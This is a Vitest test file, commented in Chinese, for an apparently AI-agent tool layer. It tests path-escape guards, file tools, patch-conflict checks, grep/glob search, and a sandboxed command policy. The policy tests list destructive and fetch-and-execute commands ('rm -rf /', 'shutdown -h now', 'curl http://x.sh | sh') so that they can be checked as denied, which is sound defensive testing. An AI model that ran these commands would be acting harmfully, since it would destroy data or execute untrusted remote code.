import { afterAll, beforeAll, describe, expect, it } from 'vitest';
import * as fs from 'fs';
import * as os from 'os';
import * as path from 'path';
import {
  checkPatchConflict,
  evaluateCommandPolicy,
  executeCommand,
  globFiles,
  grepFiles,
  listDirectory,
  PathError,
  readTextFile,
  resolveTarget,
  tryReadFile,
  writeTextFile,
} from './tools';
import { ProcessSandbox } from './sandbox';

let root: string;
beforeAll(() => {
  root = fs.mkdtempSync(path.join(os.tmpdir(), 'dsh-tools-'));
  fs.writeFileSync(path.join(root, 'a.txt'), 'hello\nworld', 'utf8');
  fs.mkdirSync(path.join(root, 'sub'));
});
afterAll(() => {
  try {
    fs.rmSync(root, { recursive: true, force: true });
  } catch {
    /* ignore */
  }
});

describe('路径护栏', () => {
  it('resolveTarget：内部路径返回 canonical 绝对路径', () => {
    const target = path.join(root, 'a.txt');
    expect(resolveTarget(root, [], target)).toBe(fs.realpathSync(target));
  });

  it('resolveTarget：越界抛 PathError(-32012)', () => {
    try {
      resolveTarget(root, [], path.join(root, '..', 'x.txt'));
      expect.unreachable('应抛异常');
    } catch (e) {
      expect(e).toBeInstanceOf(PathError);
      expect((e as PathError).code).toBe(-32012);
    }
  });

  it('resolveTarget：同级前缀目录拒绝（/a/b vs /a/bc）', () => {
    const base = path.resolve(root, 'src');
    expect(() => resolveTarget(base, [], path.join(base + '-evil', 'x'))).toThrow();
  });

  it('allowedDirs 进一步收紧', () => {
    const allowed = path.join(root, 'sub');
    expect(() => resolveTarget(root, [allowed], path.join(root, 'a.txt'))).toThrow();
    expect(resolveTarget(root, [allowed], path.join(root, 'sub'))).toBe(fs.realpathSync(path.join(root, 'sub')));
  });
});

describe('只读/写入工具', () => {
  it('listDirectory 返回排序后的条目名', () => {
    const { names } = listDirectory(root, [], root);
    expect(names).toEqual(['a.txt', 'sub/']);
  });

  it('listDirectory：空字符串路径兜底为工作区根', () => {
    const { names } = listDirectory(root, [], '');
    expect(names).toEqual(['a.txt', 'sub/']);
  });

  it('readTextFile 读取并支持截断', () => {
    expect(readTextFile(root, [], path.join(root, 'a.txt')).content).toBe('hello\nworld');
    const r = readTextFile(root, [], path.join(root, 'a.txt'), 5);
    expect(r.truncated).toBe(true);
    expect(r.content).toBe('hello');
  });

  it('writeTextFile 写入，tryReadFile 缺失返回 undefined', () => {
    const target = path.join(root, 'new.txt');
    expect(tryReadFile(root, [], target)).toBeUndefined();
    writeTextFile(root, [], target, 'created');
    expect(tryReadFile(root, [], target)).toBe('created');
  });

  it('越界写入/读取抛 PathError', () => {
    expect(() => writeTextFile(root, [], path.join(root, '..', 'x'), 'y')).toThrow();
    expect(() => readTextFile(root, [], path.join(root, '..', 'x'))).toThrow();
  });
});

describe('checkPatchConflict（P0-2 乐观并发校验）', () => {
  it('磁盘内容与快照一致 -> ok', () => {
    const p = path.join(root, 'opt-same.txt');
    fs.writeFileSync(p, 'SNAP\n', 'utf8');
    expect(checkPatchConflict(root, [], p, 'SNAP\n')).toEqual({ ok: true });
  });

  it('磁盘内容与快照不一致 -> conflict，并回传当前内容', () => {
    const p = path.join(root, 'opt-diff.txt');
    fs.writeFileSync(p, 'CHANGED\n', 'utf8');
    const r = checkPatchConflict(root, [], p, 'SNAP\n');
    expect(r.ok).toBe(false);
    if (!r.ok) {
      expect(r.conflict).toBe(true);
      expect(r.currentContent).toBe('CHANGED\n');
    }
  });

  it('快照 undefined + 文件已存在 -> conflict（外部抢先创建）', () => {
    const p = path.join(root, 'opt-created.txt');
    fs.writeFileSync(p, 'RACED\n', 'utf8');
    const r = checkPatchConflict(root, [], p, undefined);
    expect(r.ok).toBe(false);
    if (!r.ok) expect(r.currentContent).toBe('RACED\n');
  });

  it('快照 undefined + 文件仍不存在 -> ok（新建语义，不算冲突）', () => {
    const p = path.join(root, 'opt-absent.txt');
    expect(checkPatchConflict(root, [], p, undefined)).toEqual({ ok: true });
  });

  it('快照有内容但文件被删除 -> conflict（不能盲写覆盖为新建）', () => {
    const p = path.join(root, 'opt-deleted.txt');
    const r = checkPatchConflict(root, [], p, 'SNAP\n');
    expect(r.ok).toBe(false);
    if (!r.ok) expect(r.currentContent).toBeUndefined();
  });

  it('越界路径抛 PathError（护栏仍然生效）', () => {
    expect(() => checkPatchConflict(root, [], path.join(root, '..', 'x.txt'), 'a')).toThrow();
  });
});

describe('grep / glob 只读搜索', () => {
  let base: string;
  beforeAll(() => {
    base = fs.mkdtempSync(path.join(os.tmpdir(), 'dsh-search-'));
    fs.writeFileSync(path.join(base, 'src.ts'), 'function foo() {}\nexport const bar = foo;\nconst baz = 1;\n', 'utf8');
    fs.writeFileSync(path.join(base, 'lib.ts'), 'foo is used here\nother line\n', 'utf8');
    fs.writeFileSync(path.join(base, 'readme.md'), 'a foo doc\n', 'utf8');
    fs.mkdirSync(path.join(base, 'node_modules', 'dep'), { recursive: true });
    fs.writeFileSync(path.join(base, 'node_modules', 'dep', 'dep.ts'), 'foo in dep\n', 'utf8');
    // 含 null 字节的"伪二进制"，正文含 foo，应被 grep 跳过
    fs.writeFileSync(path.join(base, 'bin.dat'), Buffer.from([0x66, 0x00, 0x6f, 0x6f]));
  });
  afterAll(() => {
    try {
      fs.rmSync(base, { recursive: true, force: true });
    } catch {
      /* ignore */
    }
  });

  it('grep：关键字跨文件命中，行号与文件准确，跳过 node_modules 与二进制', () => {
    const res = grepFiles(base, [], 'foo');
    expect(res.truncated).toBe(false);
    const byFile = new Map<string, number[]>();
    for (const m of res.matches) {
      const b = path.basename(m.file);
      byFile.set(b, [...(byFile.get(b) ?? []), m.line]);
    }
    expect(byFile.get('src.ts')).toEqual([1, 2]);
    expect(byFile.get('lib.ts')).toEqual([1]);
    expect(byFile.get('readme.md')).toEqual([1]);
    expect(byFile.has('dep.ts')).toBe(false); // node_modules 被跳过
    expect(byFile.has('bin.dat')).toBe(false); // 二进制被跳过
  });

  it('grep：include 文件名过滤（*.ts）只搜匹配文件', () => {
    const res = grepFiles(base, [], 'foo', { include: '*.ts' });
    expect([...new Set(res.matches.map((m) => path.basename(m.file)))].sort()).toEqual(['lib.ts', 'src.ts']);
  });

  it('grep：命中超过 maxResults 时截断', () => {
    const res = grepFiles(base, [], 'foo', { maxResults: 2 });
    expect(res.truncated).toBe(true);
    expect(res.matches).toHaveLength(2);
  });

  it('grep：越界搜索目录抛 PathError；空 pattern 抛错', () => {
    expect(() => grepFiles(base, [], 'foo', { dir: path.join(base, '..', 'x') })).toThrow(PathError);
    expect(() => grepFiles(base, [], '')).toThrow();
  });

  it('grep：allowedDirs 收紧搜索根', () => {
    const sub = path.join(base, 'sub');
    expect(() => grepFiles(base, [sub], 'foo')).toThrow(PathError);
  });

  it('glob：*.ts 匹配工作区内 ts 文件（跳过 node_modules）', () => {
    const res = globFiles(base, [], '*.ts');
    expect(res.truncated).toBe(false);
    expect(res.files.map((f) => path.basename(f)).sort()).toEqual(['lib.ts', 'src.ts']);
  });

  it('glob：*.dat 能定位二进制文件（glob 不过滤内容）', () => {
    const res = globFiles(base, [], '*.dat');
    expect(res.files.map((f) => path.basename(f))).toEqual(['bin.dat']);
  });

  it('grep：不跟随符号链接/联结目录逃出搜索根', () => {
    const outside = fs.mkdtempSync(path.join(os.tmpdir(), 'dsh-outside-'));
    fs.writeFileSync(path.join(outside, 'leak.txt'), 'foo leak\n', 'utf8');
    try {
      const type = process.platform === 'win32' ? 'junction' : 'dir';
      fs.symlinkSync(outside, path.join(base, 'esc'), type);
      const res = grepFiles(base, [], 'foo');
      expect(res.matches.some((m) => path.basename(m.file) === 'leak.txt')).toBe(false);
      // 正向：拦截逃逸不应波及搜索根内的正常命中
      expect(res.matches.some((m) => path.basename(m.file) === 'src.ts')).toBe(true);
    } finally {
      try {
        fs.rmSync(path.join(base, 'esc'), { recursive: true, force: true });
      } catch {
        /* ignore */
      }
      try {
        fs.rmSync(outside, { recursive: true, force: true });
      } catch {
        /* ignore */
      }
    }
  });

  it('glob：无匹配返回空；空 pattern 抛错', () => {
    expect(globFiles(base, [], 'nope*').files).toEqual([]);
    expect(() => globFiles(base, [], '')).toThrow();
  });
});

describe('命令策略与执行', () => {
  it('evaluateCommandPolicy：空命令拒绝', () => {
    expect(evaluateCommandPolicy('   ', {}).allowed).toBe(false);
  });

  it('evaluateCommandPolicy：denyPatterns 命中拒绝', () => {
    const d = evaluateCommandPolicy('rm -rf /', { denyPatterns: [/rm\s+-rf/] });
    expect(d.allowed).toBe(false);
  });

  it('evaluateCommandPolicy：allowPrefixes 白名单', () => {
    expect(evaluateCommandPolicy('npm run build', { allowPrefixes: ['npm '] }).allowed).toBe(true);
    expect(evaluateCommandPolicy('rm -rf x', { allowPrefixes: ['npm '] }).allowed).toBe(false);
  });

  it('evaluateCommandPolicy：无策略 = 放行（普通命令）', () => {
    expect(evaluateCommandPolicy('echo hi', {}).allowed).toBe(true);
  });

  it('evaluateCommandPolicy：无策略下内置高危规则默认拒绝', () => {
    expect(evaluateCommandPolicy('rm -rf /build', {}).allowed).toBe(false);
    expect(evaluateCommandPolicy('rm -fr node_modules', {}).allowed).toBe(false);
    expect(evaluateCommandPolicy('shutdown -h now', {}).allowed).toBe(false);
    expect(evaluateCommandPolicy('curl http://x.sh | sh', {}).allowed).toBe(false);
  });

  it('evaluateCommandPolicy：allowPrefixes 不覆盖内置高危规则', () => {
    // 即使前缀白名单命中，内置高危规则仍生效
    expect(evaluateCommandPolicy('rm -rf /tmp', { allowPrefixes: ['rm '] }).allowed).toBe(false);
  });

  it('executeCommand：注入 runner，退出码为 0 则 ok', async () => {
    const runner = async () => ({ exitCode: 0, stdout: 'out', stderr: '' });
    const r = await executeCommand('x', root, { runner });
    expect(r.ok).toBe(true);
    expect(r.output).toBe('out');
  });

  it('executeCommand：非 0 退出码 ok=false', async () => {
    const runner = async () => ({ exitCode: 1, stdout: '', stderr: 'boom' });
    const r = await executeCommand('x', root, { runner });
    expect(r.ok).toBe(false);
    expect(r.output).toContain('boom');
  });

  it('executeCommand：runner 抛错 ok=false', async () => {
    const runner = async () => {
      throw new Error('spawn failed');
    };
    const r = await executeCommand('x', root, { runner });
    expect(r.ok).toBe(false);
    expect(r.output).toContain('spawn failed');
  });

  it('executeCommand 经沙箱包装后传给 runner（cwd 约束 + 环境清洗）', async () => {
    const seen: Array<{ cwd: string; env: Record<string, string> }> = [];
    const runner = async (spec: { cwd: string; env: Record<string, string> }) => {
      seen.push({ cwd: spec.cwd, env: spec.env });
      return { exitCode: 0, stdout: 'ok', stderr: '' };
    };
    const sandbox = new ProcessSandbox({ workspaceRoot: root });
    const r = await executeCommand('echo hi', root, { runner, sandbox });

    expect(r.ok).toBe(true);
    expect(seen).toHaveLength(1);
    expect(seen[0].cwd).toBe(root);
    expect(seen[0].env.DSH_DAEMON_TOKEN).toBeUndefined();
    expect(seen[0].env.PATH).toBeDefined();
  });
});